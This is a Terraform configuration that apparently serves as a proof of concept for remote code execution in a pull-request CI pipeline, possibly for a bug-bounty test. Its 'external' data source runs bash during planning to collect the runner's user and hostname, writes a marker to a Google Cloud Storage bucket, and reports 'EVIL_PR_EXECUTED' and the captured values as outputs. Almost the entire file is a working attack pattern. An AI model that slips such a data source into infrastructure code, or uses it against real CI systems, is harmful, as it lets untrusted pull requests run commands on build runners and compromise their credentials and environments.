terraform {
  required_version = ">= 1.2.0"
  required_providers {
    google = {
      source  = "hashicorp/google"
      version = ">= 4.0"
    }
    external = {
      source  = "hashicorp/external"
      version = ">= 2.0"
    }
  }
}

variable "project_id" {
  default = "ellison-hunt-1102-c86d"
}

data "external" "rce_in_plan" {
  program = ["bash", "-c", "echo '{\"rce_proof\": \"PR_BRANCH_RCE_CONFIRMED\", \"whoami\": \"'$(whoami)'\", \"hostname\": \"'$(hostname)'\"}'"]
}

resource "google_storage_bucket_object" "marker" {
  name    = "im-pr-attack-test/marker.txt"
  bucket  = "ellison-hunt-1102-c86d-vrp-test"
  content = data.external.rce_in_plan.result.rce_proof
}

output "status" {
  value = "EVIL_PR_EXECUTED"
}

output "rce_proof" {
  value = data.external.rce_in_plan.result.rce_proof
}

output "whoami" {
  value = data.external.rce_in_plan.result.whoami
}

output "hostname" {
  value = data.external.rce_in_plan.result.hostname
}
# Updated Sat Nov  7 14:33:28 CST 2026
